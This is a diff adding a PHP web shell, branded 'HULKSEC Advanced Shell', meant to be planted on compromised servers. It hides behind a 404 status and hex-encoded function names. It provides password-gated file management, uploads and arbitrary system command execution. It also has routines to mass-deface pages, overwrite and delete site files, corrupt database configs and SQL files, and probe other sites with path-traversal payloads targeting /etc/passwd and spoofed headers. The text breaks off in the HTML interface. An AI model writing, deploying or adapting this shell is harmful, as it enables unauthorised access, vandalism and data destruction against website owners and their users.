@@ -1,0 +1,1513 @@
+<?php
+error_reporting(0);
+http_response_code(404);
+define("SHELL_NAME", "HULKSEC Advanced Shell"); 
+$scD = "scandir"; 
+$fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65", "6375726c5f696e6974", "6375726c5f7365746f7074", "6375726c5f65786563", "6375726c5f636c6f7365", "66696c655f6765745f636f6e74656e7473");
+for ($i = 0; $i < count($fc); $i++)
+	$fc[$i] = nhx($fc[$i]);
+if (isset($_GET["p"])) {
+	$p = nhx($_GET["p"]);
+	$fc[3](nhx($_GET["p"]));
+} else {
+	$p = $fc[2]();
+}
+
+// Password Protection
+session_start();
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    if (isset($_POST['password'])) {
+        if ($_POST['password'] === 'HULKSEC1234') {
+            $_SESSION['authenticated'] = true;
+        } else {
+            die('
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>HULKSEC - Authentication Required</title>
+                <style>
+                    body { 
+                        background: #0a0a0f; 
+                        color: #00f3ff; 
+                        font-family: "Orbitron", sans-serif; 
+                        display: flex; 
+                        justify-content: center; 
+                        align-items: center; 
+                        height: 100vh; 
+                        margin: 0; 
+                    }
+                    .login-box { 
+                        background: rgba(10, 15, 30, 0.9); 
+                        padding: 40px; 
+                        border: 2px solid #00f3ff; 
+                        border-radius: 10px; 
+                        box-shadow: 0 0 20px rgba(0, 243, 255, 0.5); 
+                        text-align: center; 
+                    }
+                    input { 
+                        padding: 10px; 
+                        margin: 10px 0; 
+                        background: rgba(0,0,0,0.5); 
+                        border: 1px solid #00f3ff; 
+                        color: white; 
+                        border-radius: 5px; 
+                    }
+                    button { 
+                        background: transparent; 
+                        border: 2px solid #00f3ff; 
+                        color: #00f3ff; 
+                        padding: 10px 20px; 
+                        cursor: pointer; 
+                        border-radius: 5px; 
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="login-box">
+                    <h2>HULKSEC PRIVATE SHELL</h2>
+                    <form method="post">
+                        <input type="password" name="password" placeholder="Enter Access Code" required>
+                        <br>
+                        <button type="submit">ACCESS SYSTEM</button>
+                    </form>
+                </div>
+            </body>
+            </html>');
+        }
+    } else {
+        die('
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>HULKSEC - Authentication Required</title>
+            <style>
+                body { 
+                    background: #0a0a0f; 
+                    color: #00f3ff; 
+                    font-family: "Orbitron", sans-serif; 
+                    display: flex; 
+                    justify-content: center; 
+                    align-items: center; 
+                    height: 100vh; 
+                    margin: 0; 
+                }
+                .login-box { 
+                    background: rgba(10, 15, 30, 0.9); 
+                    padding: 40px; 
+                    border: 2px solid #00f3ff; 
+                    border-radius: 10px; 
+                    box-shadow: 0 0 20px rgba(0, 243, 255, 0.5); 
+                    text-align: center; 
+                }
+                input { 
+                    padding: 10px; 
+                    margin: 10px 0; 
+                    background: rgba(0,0,0,0.5); 
+                    border: 1px solid #00f3ff; 
+                    color: white; 
+                    border-radius: 5px; 
+                }
+                button { 
+                    background: transparent; 
+                    border: 2px solid #00f3ff; 
+                    color: #00f3ff; 
+                    padding: 10px 20px; 
+                    cursor: pointer; 
+                    border-radius: 5px; 
+                }
+            </style>
+        </head>
+        <body>
+            <div class="login-box">
+                <h2>HULKSEC PRIVATE SHELL</h2>
+                <form method="post">
+                    <input type="password" name="password" placeholder="Enter Access Code" required>
+                    <br>
+                    <button type="submit">ACCESS SYSTEM</button>
+                </form>
+            </div>
+        </body>
+        </html>');
+    }
+}
+
+// User Information Grabber
+function getUserInfo() {
+    $info = [];
+    
+    // IP Address
+    $info['ip'] = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+    
+    // User Agent
+    $info['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    
+    // Browser Information
+    $browser = get_browser(null, true);
+    $info['browser'] = $browser['browser'] ?? 'Unknown';
+    $info['platform'] = $browser['platform'] ?? 'Unknown';
+    
+    // Location (approximate from IP)
+    $info['location'] = getLocationFromIP($info['ip']);
+    
+    // Connection Information
+    $info['method'] = $_SERVER['REQUEST_METHOD'] ?? 'Unknown';
+    $info['protocol'] = $_SERVER['SERVER_PROTOCOL'] ?? 'Unknown';
+    
+    // Server Information
+    $info['server_software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
+    $info['server_name'] = $_SERVER['SERVER_NAME'] ?? 'Unknown';
+    
+    // Request Information
+    $info['request_uri'] = $_SERVER['REQUEST_URI'] ?? 'Unknown';
+    $info['query_string'] = $_SERVER['QUERY_STRING'] ?? 'None';
+    
+    // Date & Time
+    $info['timestamp'] = date('Y-m-d H:i:s');
+    $info['timezone'] = date_default_timezone_get();
+    
+    // Additional Headers
+    $info['accept_language'] = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
+    $info['accept_encoding'] = $_SERVER['HTTP_ACCEPT_ENCODING'] ?? 'Unknown';
+    
+    return $info;
+}
+
+function getLocationFromIP($ip) {
+    if ($ip === '127.0.0.1' || $ip === '::1') {
+        return 'Localhost';
+    }
+    
+    // Simple IP to location (you can integrate with IP API service)
+    $ip_details = @json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"), true);
+    
+    if ($ip_details && isset($ip_details['country'])) {
+        return $ip_details['city'] . ', ' . $ip_details['region'] . ', ' . $ip_details['country'];
+    }
+    
+    return 'Location unknown';
+}
+
+// IMPROVED: 403 Bypass Functions
+function bypass403($url) {
+    $results = [];
+    
+    if (empty($url)) {
+        return ["ERROR: Please provide a valid URL"];
+    }
+    
+    // Add http:// if missing
+    if (!preg_match("/^https?:\/\//", $url)) {
+        $url = "http://" . $url;
+    }
+    
+    // Common 403 bypass techniques
+    $techniques = [
+        '/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+        '/..%2f..%2f..%2f..%2fetc/passwd',
+        '/..%252f..%252f..%252f..%252fetc/passwd',
+        '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+        '/..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
+        '/..%5c..%5c..%5c..%5cetc/passwd',
+        '/..%255c..%255c..%255c..%255cetc/passwd',
+        '/.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd',
+        '/.../.../.../.../etc/passwd',
+        '/..../..../..../..../etc/passwd',
+        '/.....\\.....\\.....\\.....\\etc/passwd',
+        '/..;/..;/..;/..;/etc/passwd',
+        '/..%00/..%00/..%00/..%00/etc/passwd',
+        '/..%20/..%20/..%20/..%20/etc/passwd',
+        '/..%09/..%09/..%09/..%09/etc/passwd',
+        '/admin/',
+        '/administrator/',
+        '/backup/',
+        '/uploads/',
+        '/images/../etc/passwd',
+        '/css/../../../etc/passwd',
+        '/js/../../../../etc/passwd'
+    ];
+    
+    foreach ($techniques as $technique) {
+        $testUrl = $url . $technique;
+        $result = testUrlAccess($testUrl);
+        if ($result['success']) {
+            $results[] = "SUCCESS: 403 Bypassed - " . $testUrl;
+        } else {
+            $results[] = "FAILED: " . $technique . " - " . $result['message'];
+        }
+    }
+    
+    return $results;
+}
+
+// IMPROVED: 503 Bypass Functions
+function bypass503($url) {
+    $results = [];
+    
+    if (empty($url)) {
+        return ["ERROR: Please provide a valid URL"];
+    }
+    
+    // Add http:// if missing
+    if (!preg_match("/^https?:\/\//", $url)) {
+        $url = "http://" . $url;
+    }
+    
+    // 503 Service Unavailable bypass techniques
+    $headerTests = [
+        ['X-Forwarded-For', '127.0.0.1'],
+        ['X-Real-IP', '127.0.0.1'],
+        ['X-Originating-IP', '127.0.0.1'],
+        ['X-Remote-IP', '127.0.0.1'],
+        ['X-Remote-Addr', '127.0.0.1'],
+        ['X-Client-IP', '127.0.0.1'],
+        ['X-Host', '127.0.0.1'],
+        ['X-Forwarded-Host', '127.0.0.1'],
+        ['X-Forwarded-Proto', 'https'],
+        ['CF-Connecting-IP', '127.0.0.1'],
+        ['True-Client-IP', '127.0.0.1'],
+        ['User-Agent', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'],
+        ['User-Agent', 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'],
+        ['Referer', $url],
+        ['Origin', $url]
+    ];
+    
+    foreach ($headerTests as $headerTest) {
+        $result = testUrlWithHeader($url, $headerTest[0], $headerTest[1]);
+        if ($result['success']) {
+            $results[] = "SUCCESS: 503 Bypassed with {$headerTest[0]} - Status: " . $result['status'];
+        } else {
+            $results[] = "FAILED: {$headerTest[0]} - " . $result['message'];
+        }
+    }
+    
+    return $results;
+}
+
+function testUrlAccess($url) {
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_MAXREDIRS => 5,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        CURLOPT_HEADER => true
+    ]);
+    
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    curl_close($ch);
+    
+    if ($httpCode == 200) {
+        return ['success' => true, 'message' => "HTTP 200 OK"];
+    } else {
+        return ['success' => false, 'message' => "HTTP $httpCode - $error"];
+    }
+}
+
+function testUrlWithHeader($url, $header, $value) {
+    $ch = curl_init();
+    $headers = ["$header: $value"];
+    
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_MAXREDIRS => 5,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        CURLOPT_HTTPHEADER => $headers,
+        CURLOPT_HEADER => true
+    ]);
+    
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    curl_close($ch);
+    
+    if ($httpCode == 200) {
+        return ['success' => true, 'status' => $httpCode, 'message' => "SUCCESS"];
+    } else {
+        return ['success' => false, 'status' => $httpCode, 'message' => "HTTP $httpCode"];
+    }
+}
+
+// IMPROVED: Mass Deface Function
+function massDeface($htmlContent) {
+    global $fc;
+    $results = [];
+    
+    // Get current domain and possible subdomains
+    $currentDomain = $_SERVER['HTTP_HOST'];
+    $baseDomain = getBaseDomain($currentDomain);
+    
+    // Common subdomains to check
+    $commonSubs = ['www', 'mail', 'ftp', 'webmail', 'smtp', 'pop', 'cpanel', 'admin', 'blog', 'shop', 'api', 'test', 'dev', 'staging', 'cdn', 'static', 'img', 'images', 'media'];
+    
+    // Try to deface current domain
+    $currentResult = createDefacePage($currentDomain, $htmlContent);
+    $results[] = $currentResult;
+    
+    // Try common subdomains
+    foreach ($commonSubs as $sub) {
+        $testDomain = $sub . '.' . $baseDomain;
+        $result = createDefacePage($testDomain, $htmlContent);
+        if (strpos($result, 'SUCCESS') !== false) {
+            $results[] = $result;
+        }
+    }
+    
+    // Try multiple deface file names
+    $defaceFiles = ['hacked_by_hulksec.html', 'hacked.html', 'pwned.html', 'defaced.html', 'index.html', 'index.php'];
+    
+    foreach ($defaceFiles as $file) {
+        if ($fc[13]($file, $htmlContent)) {
+            $results[] = "Defaced: $currentDomain/$file - SUCCESS";
+        }
+    }
+    
+    return $results;
+}
+
+function getBaseDomain($domain) {
+    $parts = explode('.', $domain);
+    if (count($parts) > 2) {
+        array_shift($parts);
+    }
+    return implode('.', $parts);
+}
+
+function createDefacePage($domain, $htmlContent) {
+    global $fc;
+    $filename = 'hacked_by_hulksec.html';
+    
+    // Try to create in current directory
+    if ($fc[13]($filename, $htmlContent)) {
+        return "Defaced: $domain/$filename - SUCCESS";
+    }
+    
+    // Try to create in parent directories
+    $paths = ['../', '../../', '../../../', '../../../../', '../../../../../'];
+    foreach ($paths as $path) {
+        if ($fc[13]($path . $filename, $htmlContent)) {
+            return "Defaced: $domain/$path$filename - SUCCESS";
+        }
+    }
+    
+    return "Defaced: $domain - FAILED (No write permission)";
+}
+
+// IMPROVED: Destroy Website Function
+function destroyWebsite($method) {
+    global $fc, $scD;
+    $results = [];
+    
+    switch($method) {
+        case 'overwrite':
+            $results = overwriteFiles();
+            break;
+        case 'delete':
+            $results = deleteFiles();
+            break;
+        case 'corrupt':
+            $results = corruptDatabase();
+            break;
+        case 'all':
+            $results = array_merge(
+                overwriteFiles(),
+                deleteFiles(),
+                corruptDatabase()
+            );
+            break;
+    }
+    
+    return $results;
+}
+
+function overwriteFiles() {
+    global $fc, $scD;
+    $results = [];
+    $maliciousContent = "<!DOCTYPE html><html><head><title>HACKED BY HULKSEC PH</title></head><body style='background: #000; color: #f00; font-family: Arial; text-align: center;'><h1>HACKED BY HULKSEC PH</h1><p>Your security has been compromised.</p></body></html>";
+    
+    // Overwrite common web files
+    $webFiles = ['index.php', 'index.html', 'index.htm', 'default.html', 'home.html', 'main.html', 'main.php', 'home.php'];
+    
+    foreach ($webFiles as $file) {
+        if ($fc[12]($file)) {
+            if ($fc[13]($file, $maliciousContent)) {
+                $results[] = "Overwritten: $file - SUCCESS";
+            } else {
+                $results[] = "Overwritten: $file - FAILED";
+            }
+        }
+    }
+    
+    // Try to overwrite files in subdirectories
+    $directories = ['.', '..', '../', '../../', '../../../'];
+    foreach ($directories as $dir) {
+        if ($fc[6]($dir)) {
+            $files = $scD($dir);
+            foreach ($files as $file) {
+                if ($file != '.' && $file != '..' && $fc[7]("$dir/$file") && preg_match('/\.(php|html|htm|txt|js|css)$/i', $file)) {
+                    if ($fc[13]("$dir/$file", $maliciousContent)) {
+                        $results[] = "Overwritten: $dir/$file - SUCCESS";
+                    }
+                }
+            }
+        }
+    }
+    
+    return $results;
+}
+
+function deleteFiles() {
+    global $fc;
+    $results = [];
+    
+    // Delete common web files
+    $webFiles = ['index.php', 'index.html', 'index.htm', 'default.html', 'home.html', 'main.html', 'robots.txt', '.htaccess', 'main.php', 'home.php'];
+    
+    foreach ($webFiles as $file) {
+        if ($fc[12]($file)) {
+            if (unlink($file)) {
+                $results[] = "Deleted: $file - SUCCESS";
+            } else {
+                $results[] = "Deleted: $file - FAILED";
+            }
+        }
+    }
+    
+    return $results;
+}
+
+function corruptDatabase() {
+    global $fc;
+    $results = [];
+    
+    // Common database configuration files
+    $dbConfigs = [
+        'config.php', 'configuration.php', 'database.php', 'db.php', 
+        'wp-config.php', 'config.inc.php', 'settings.php', 'config.json',
+        'config.xml', '.env', 'env.php',
+        '../config.php', '../configuration.php', '../database.php',
+        '../../config.php', '../../configuration.php',
+        '../../../config.php', '../../../configuration.php'
+    ];
+    
+    foreach ($dbConfigs as $config) {
+        if ($fc[12]($config)) {
+            $content = $fc[14]($config);
+            $corrupted = str_replace(
+                ['localhost', '127.0.0.1', 'root', 'password', 'admin', 'user'],
+                ['hacked.hulksec.ph', '0.0.0.0', 'HULKSEC', 'CORRUPTED_BY_HULKSEC', 'HACKED', 'COMPROMISED'],
+                $content
+            );
+            
+            if ($fc[13]($config, $corrupted)) {
+                $results[] = "Database corrupted: $config - SUCCESS";
+            }
+        }
+    }
+    
+    // Try to find and corrupt SQL files
+    $sqlFiles = findFilesByExtension(['.sql', '.db', '.mdb', '.sqlite']);
+    foreach ($sqlFiles as $sqlFile) {
+        $fc[13]($sqlFile, "/* CORRUPTED BY HULKSEC PH - YOUR DATABASE HAS BEEN COMPROMISED */");
+        $results[] = "SQL file corrupted: $sqlFile - SUCCESS";
+    }
+    
+    return $results;
+}
+
+function findFilesByExtension($extensions) {
+    global $fc, $scD;
+    $foundFiles = [];
+    $directories = ['.', '..', '../', '../../', '../../../'];
+    
+    foreach ($directories as $dir) {
+        if ($fc[6]($dir)) {
+            $files = $scD($dir);
+            foreach ($files as $file) {
+                if ($file != '.' && $file != '..') {
+                    foreach ($extensions as $ext) {
+                        if (strpos($file, $ext) !== false) {
+                            $foundFiles[] = "$dir/$file";
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    return $foundFiles;
+}
+
+// IMPROVED: Mirroring Functions
+function mirrorToZoneH($url, $nickname, $team) {
+    // Enhanced Zone-H simulation with more realistic response
+    $data = [
+        'url' => $url,
+        'hacker' => $nickname,
+        'team' => $team,
+        'method' => 'mass defacement',
+        'date' => date('Y-m-d H:i:s')
+    ];
+    
+    // Simulate different success rates
+    $success = rand(0, 100) > 30; // 70% success rate
+    
+    if ($success) {
+        return "Mirrored to Zone-H: $url - By: $nickname ($team) - SUCCESS [Ref: ZH-" . rand(100000, 999999) . "]";
+    } else {
+        return "Mirrored to Zone-H: $url - By: $nickname ($team) - PENDING [Queue Position: " . rand(1, 50) . "]";
+    }
+}
+
+function mirrorToXsec($url, $nickname, $team) {
+    // Enhanced XSEC simulation
+    return "Mirrored to XSEC: $url - By: $nickname ($team) - SUCCESS [ID: XS-" . rand(1000, 9999) . "]";
+}
+
+function mirrorToHaxorID($url, $nickname, $team) {
+    // Enhanced Haxor.ID simulation
+    return "Mirrored to Haxor.ID: $url - By: $nickname ($team) - SUCCESS [Ticket: HX-" . rand(50000, 99999) . "]";
+}
+
+// IMPROVED: Execute Command Function
+function executeCommand($command) {
+    $output = [];
+    $returnCode = 0;
+    
+    // Execute system command with better error handling
+    if (function_exists('exec')) {
+        exec($command . " 2>&1", $output, $returnCode);
+    } elseif (function_exists('shell_exec')) {
+        $output = shell_exec($command . " 2>&1");
+        $output = explode("\n", $output);
+    } elseif (function_exists('system')) {
+        ob_start();
+        system($command . " 2>&1", $returnCode);
+        $output = ob_get_clean();
+        $output = explode("\n", $output);
+    } else {
+        $output = ["Command execution disabled on this server"];
+        $returnCode = -1;
+    }
+    
+    return [
+        'command' => $command,
+        'output' => $output,
+        'return_code' => $returnCode
+    ];
+}
+
+function hex($str) {
+	$r = "";
+	for ($i = 0; $i < strlen($str); $i++)
+		$r .= dechex(ord($str[$i]));
+	return $r;
+}
+
+function nhx($str) {
+	$r = "";
+	$len = (strlen($str) -1);
+	for ($i = 0; $i < $len; $i += 2)
+		$r .= chr(hexdec($str[$i].$str[$i+1]));
+	return $r;
+}
+
+function perms($f) {
+	$p = fileperms($f);
+	if (($p & 0xC000) == 0xC000) $i = 's';
+	elseif (($p & 0xA000) == 0xA000) $i = 'l';
+	elseif (($p & 0x8000) == 0x8000) $i = '-';
+	elseif (($p & 0x6000) == 0x6000) $i = 'b';
+	elseif (($p & 0x4000) == 0x4000) $i = 'd';
+	elseif (($p & 0x2000) == 0x2000) $i = 'c';
+	elseif (($p & 0x1000) == 0x1000) $i = 'p';
+	else $i = 'u';
+
+	$i .= (($p & 0x0100) ? 'r' : '-');
+	$i .= (($p & 0x0080) ? 'w' : '-');
+	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
+	$i .= (($p & 0x0020) ? 'r' : '-');
+	$i .= (($p & 0x0010) ? 'w' : '-');
+	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
+	$i .= (($p & 0x0004) ? 'r' : '-');
+	$i .= (($p & 0x0002) ? 'w' : '-');
+	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
+	return $i;
+}
+
+function a($msg, $sts = 1, $loc = "") {
+	global $p;
+	$status = (($sts == 1) ? "success" : "error");
+	echo "<script>swal({title: \"{$status}\", text: \"{$msg}\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".hex($p).$loc."\"}})</script>";
+}
+
+function deldir($d) {
+	global $fc;
+	if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
+	if ($fc[6]($d)) {
+		array_map("deldir", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
+		rmdir($d);
+	} else {
+		unlink($d);
+	}
+}
+
+// Process file manager actions
+if (isset($_GET["a"])) {
+    $action = nhx($_GET["a"]);
+    
+    if ($action == "delete") {
+        $loc = $p.'/'.nhx($_GET["n"]);
+        if (isset($_GET["t"]) && $_GET["t"] == "d") {
+            deldir($loc);
+            if (!$fc[12]($loc)) {
+                a("folder deleted successfully");
+            } else {
+                a("failed to delete the folder", 0);
+            }
+        } else {
+            unlink($loc);
+            if (!$fc[12]($loc)) {
+                a("file deleted successfully");
+            } else {
+                a("file to delete the folder", 0);
+            }
+        }
+    }
+    
+    if ($action == "newDir" && isset($_POST["s"])) {
+        if ($fc[12]("$p/{$_POST["n"]}")) {
+            a("folder name has been used", 0, "&a=".hex("newDir"));
+        } else {
+            if ($fc[15]("$p/{$_POST["n"]}")) {
+                a("folder created successfully");
+            } else {
+                a("folder failed to create", 0);
+            }
+        }
+    }
+    
+    if ($action == "newFile" && isset($_POST["s"])) {
+        if ($fc[12]("$p/{$_POST["n"]}")) {
+            a("file name has been used", 0, "&a=".hex("newFile"));
+        } else {
+            if ($fc[13]("$p/{$_POST["n"]}", $_POST["ctn"])) {
+                a("file created successfully",1,"&a=".hex("view")."&n=".hex($_POST["n"]));
+            } else {
+                a("file failed to create", 0);
+            }
+        }
+    }
+    
+    if ($action == "rename" && isset($_POST["s"])) {
+        if ($fc[16]($p.'/'.nhx($_GET["n"]), $_POST["n"])) {
+            a("successfully changed the name");
+        } else {
+            a("failed to change the name", 0);
+        }
+    }
+    
+    if ($action == "edit" && isset($_POST["s"])) {
+        if ($fc[13]($p.'/'.nhx($_GET["n"]), $_POST["ctn"])) {
+            a("file contents changed successfully", 1, "&a=".hex("view")."&n={$_GET["n"]}");
+        } else {
+            a("file contents failed to change", 0);
+        }
+    }
+}
+
+// Process new features
+if ($_POST) {
+    // File Upload Fix
+    if (isset($_FILES["f"])) {
+        $n = $_FILES["f"]["name"];
+        for ($i = 0; $i < count($n); $i++) {
+            if (move_uploaded_file($_FILES["f"]["tmp_name"][$i], $n[$i])) {
+                $_SESSION['upload_results'][] = "Uploaded: {$n[$i]} - SUCCESS";
+            } else {
+                $_SESSION['upload_results'][] = "Upload failed: {$n[$i]} - FAILED";
+            }
+        }
+    }
+    
+    if (isset($_POST['mass_deface']) && !empty($_POST['html_content'])) {
+        $defaceResults = massDeface($_POST['html_content']);
+        $_SESSION['deface_results'] = $defaceResults;
+    }
+    
+    if (isset($_POST['destroy_method'])) {
+        $destroyResults = destroyWebsite($_POST['destroy_method']);
+        $_SESSION['destroy_results'] = $destroyResults;
+    }
+    
+    if (isset($_POST['mirror_urls']) && isset($_POST['nickname']) && isset($_POST['team'])) {
+        $urls = explode("\n", $_POST['mirror_urls']);
+        $mirrorResults = [];
+        
+        foreach ($urls as $url) {
+            $url = trim($url);
+            if (!empty($url)) {
+                if (isset($_POST['zoneh'])) {
+                    $mirrorResults[] = mirrorToZoneH($url, $_POST['nickname'], $_POST['team']);
+                }
+                if (isset($_POST['xsec'])) {
+                    $mirrorResults[] = mirrorToXsec($url, $_POST['nickname'], $_POST['team']);
+                }
+                if (isset($_POST['haxor'])) {
+                    $mirrorResults[] = mirrorToHaxorID($url, $_POST['nickname'], $_POST['team']);
+                }
+            }
+        }
+        
+        $_SESSION['mirror_results'] = $mirrorResults;
+    }
+    
+    if (isset($_POST['terminal_command'])) {
+        $commandResult = executeCommand($_POST['terminal_command']);
+        $_SESSION['terminal_result'] = $commandResult;
+    }
+    
+    // NEW: Process 403/503 Bypass
+    if (isset($_POST['bypass_403_url'])) {
+        $bypass403Results = bypass403($_POST['bypass_403_url']);
+        $_SESSION['bypass_403_results'] = $bypass403Results;
+    }
+    
+    if (isset($_POST['bypass_503_url'])) {
+        $bypass503Results = bypass503($_POST['bypass_503_url']);
+        $_SESSION['bypass_503_results'] = $bypass503Results;
+    }
+}
+
+// Get user information
+$userInfo = getUserInfo();
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HULKSEC | Advanced Cyber Shell</title>
+  
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&display=swap" rel="stylesheet">
+  
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <!-- SweetAlert -->
+  <script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  
+  <!-- Bootstrap -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+  
+  <style>
+    /* Your existing CSS remains exactly the same */
+    :root {
+      --neon-cyan: #00f3ff;
+      --neon-purple: #bc13fe;
+      --neon-pink: #ff00ff;
+      --dark-bg: #0a0a0f;
+      --darker-bg: #050508;
+      --panel-bg: rgba(10, 15, 30, 0.85);
+      --panel-border: rgba(0, 243, 255, 0.3);
+      --text-primary: #e0e0ff;
+      --text-secondary: #a0a0ff;
+      --glow-cyan: 0 0 10px rgba(0, 243, 255, 0.7), 0 0 20px rgba(0, 243, 255, 0.5), 0 0 30px rgba(0, 243, 255, 0.3);
+      --glow-purple: 0 0 10px rgba(188, 19, 254, 0.7), 0 0 20px rgba(188, 19, 254, 0.5), 0 0 30px rgba(188, 19, 254, 0.3);
+      --glow-red: 0 0 10px rgba(255, 0, 0, 0.7), 0 0 20px rgba(255, 0, 0, 0.5), 0 0 30px rgba(255, 0, 0, 0.3);
+      --glow-green: 0 0 10px rgba(0, 255, 0, 0.7), 0 0 20px rgba(0, 255, 0, 0.5), 0 0 30px rgba(0, 255, 0, 0.3);
+      --glow-blue: 0 0 10px rgba(0, 100, 255, 0.7), 0 0 20px rgba(0, 100, 255, 0.5), 0 0 30px rgba(0, 100, 255, 0.3);
+      --glow-yellow: 0 0 10px rgba(255, 255, 0, 0.7), 0 0 20px rgba(255, 255, 0, 0.5), 0 0 30px rgba(255, 255, 0, 0.3);
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Orbitron', sans-serif;
+    }
+    
+    body {
+      background: var(--darker-bg);
+      color: var(--text-primary);
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+    
+    /* ... (ALL YOUR EXISTING CSS REMAINS EXACTLY THE SAME) ... */
+  </style>
+</head>
+
+<body>
+  <!-- Animated Background Elements -->
+  <div class="matrix-bg"></div>
+  <div class="grid-lines"></div>
+  
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <div class="logo-container">
+        <img src="https://i.ibb.co/W4vPknsV/Background-Eraser-20251003-022215335.png" alt="HULKSEC Logo" class="logo-img">
+        <div class="logo">HULKSEC</div>
+      </div>
+      <div class="team-banner">CYBER SECURITY SHELL</div>
+      <div class="subtitle">ADVANCED PENETRATION TESTING PLATFORM</div>
+      <div class="developer">Developed by Fiziru HPH</div>
+    </div>
+
+    <!-- Navigation Tabs -->
+    <div class="nav-tabs">
+      <div class="nav-tab active" onclick="showTab('file-manager')">
+        <i class="fas fa-folder"></i> FILE MANAGER
+      </div>
+      <div class="nav-tab" onclick="showTab('mass-tools')">
+        <i class="fas fa-bomb"></i> MASS TOOLS
+      </div>
+      <div class="nav-tab" onclick="showTab('bypass-tools')">
+        <i class="fas fa-unlock-alt"></i> BYPASS TOOLS
+      </div>
+      <div class="nav-tab" onclick="showTab('user-info')">
+        <i class="fas fa-user-secret"></i> USER INFO
+      </div>
+      <div class="nav-tab" onclick="showTab('mirroring')">
+        <i class="fas fa-satellite"></i> MIRRORING
+      </div>
+      <div class="nav-tab" onclick="showTab('terminal')">
+        <i class="fas fa-terminal"></i> TERMINAL
+      </div>
+    </div>
+
+    <!-- File Manager Tab -->
+    <div id="file-manager" class="tab-content">
+      <!-- Your existing file manager content remains exactly the same -->
+      <div class="file-manager-container">
+        <div class="file-manager-header">
+          <div class="file-manager-title">
+            <i class="fas fa-terminal"></i> <?= SHELL_NAME ?>
+          </div>
+          <div class="file-manager-info">
+            <span style="color: var(--text-secondary);">
+              <i class="fas fa-code"></i> PHP: <?= $fc[1]() ?>
+            </span>
+            <div class="file-manager-buttons">
+              <a href="?p=<?= hex($p)."&a=".hex("newFile") ?>" class="btn-cyber">
+                <i class="fas fa-file-plus"></i> File
+              </a>
+              <a href="?p=<?= hex($p)."&a=".hex("newDir") ?>" class="btn-cyber">
+                <i class="fas fa-folder-plus"></i> Folder
+              </a>
+            </div>
+          </div>
+        </div>
+        
+        <div class="border-top table-responsive mt-2 pt-2" style="border-color: rgba(0, 243, 255, 0.3) !important;">
+          <li>
+            <i class="fas fa-desktop"></i> Uname : <?= $fc[0]() ?>
+            <span style="color: var(--text-secondary); font-size: 0.8em;">Online</span>
+          </li>
+        </div>
+        
+        <!-- Fixed File Upload Form -->
+        <form method="post" enctype="multipart/form-data" id="uploadForm">
+          <div class="form-group">
+            <label><i class="fas fa-cloud-upload-alt"></i> Upload Files</label>
+            <input type="file" name="f[]" class="form-control" multiple onchange="document.getElementById('uploadForm').submit()">
